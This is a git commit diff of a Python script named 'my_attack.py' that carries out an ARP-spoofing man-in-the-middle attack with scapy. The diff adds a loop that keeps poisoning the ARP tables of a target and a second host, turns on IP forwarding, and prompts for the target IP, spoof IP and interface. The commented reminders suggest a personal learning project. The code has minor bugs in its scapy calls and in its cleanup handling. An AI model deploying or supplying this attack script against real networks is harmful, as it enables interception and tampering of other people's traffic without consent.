ffb620dfaa0ff2a82a840c1e987c34ae6da99f13
Adi Vered <veredfamily36@gmail.com>
2025-07-19 19:55:24 +0300

    main structure, ips managed

--- my_attack.py
+++ my_attack.py
@@ -1,6 +1,9 @@
 from scapy.all import *
 import os
 
+# specifically MITM attack in this code
+
+# settings:
 def enable_ip_forwarding():
     print ("Enabling IP Forwarding")
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
@@ -9,14 +12,11 @@ def disable_ip_forwarding():
     print ("Disabling IP Forwarding")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
+# reminders for me as i code:
 # pdst is where the ARP packet should go (target) - destination ip,
 # psrc is the IP to update in the target's arp table,
 # hwsrc is the MAC corresponding to psrc, to update in the target's arp table
 # hwdst is the MAC corresponding to pdst, to update in the target's arp table
-
-target_ip = "" 
-spoof_ip = ""
-interface = ""
 
 def find_mac_address(ip):
     packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.arp(pdst = ip) # asking "who has this ip?"
@@ -36,17 +36,26 @@ def restore(victim_ip, source_ip):
     scapy.send(packet, iface=interface, verbose=False)
     print(f"Restoring {victim_ip} to its original state.")
 
-def main():
+def run():
     enable_ip_forwarding()
     # attacking:
-    spoof(target_ip, spoof_ip)
-    spoof(spoof_ip, target_ip)
-    # restoring:
-    restore(target_ip, spoof_ip)
-    restore(spoof_ip, target_ip)
+    print(f"attacking {spoof_ip}...")
+    try:
+        while True:
+            spoof(target_ip, spoof_ip)
+            spoof(spoof_ip, target_ip)
+    except Exception:
+        # restoring:
+        restore(target_ip, spoof_ip)
+        restore(spoof_ip, target_ip)
+        print("ARP tables restored")
+    
     disable_ip_forwarding()
 
 if __name__ == "__main__":
-    main()
+    target_ip = input("Enter target ip") 
+    spoof_ip = input("Enter spoof ip") 
+    interface = input("Enter interface") 
+    run()
 
 
